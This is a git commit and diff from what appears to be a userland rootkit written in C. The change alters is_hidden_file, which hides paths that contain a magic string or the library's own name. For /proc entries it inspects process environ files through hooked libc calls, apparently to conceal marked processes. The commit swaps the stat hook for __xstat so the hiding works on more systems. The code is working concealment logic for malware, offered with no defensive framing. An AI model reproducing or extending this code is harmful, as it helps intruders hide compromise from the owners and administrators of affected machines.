77bf76bf93cae69fa1fbcbe4acd36b83ec6899a0
mzap <mzapata@student.42.fr>
2015-05-30 16:27:03 +0200

    fix(core): use the real stat(2) on every system
    prevent a segfault on machine not really defining stat but __xstat

--- src/is_hidden_file.c
+++ src/is_hidden_file.c
@@ -42,11 +42,12 @@ int         is_hidden_file(const char *path) {
     if (strstr(path, MAGIC_STRING) || strstr(path, LIBRARY_NAME))
         return (1);
 
+
     if (strstr(path, PROC_PATH)) {
-        if (REAL_STAT(path, &s_fstat) != -1) {
+        if (REAL___XSTAT(_STAT_VER, path, &s_fstat) != -1) {
             snprintf(environ, PATH_MAX, ENV_LINE, path);
 
-            if (REAL_STAT(environ, &s_fstat) != -1) {
+            if (REAL___XSTAT(_STAT_VER, environ, &s_fstat) != -1) {
                 env_file = REAL_FOPEN(environ, "r");
 
                 if (env_file) {
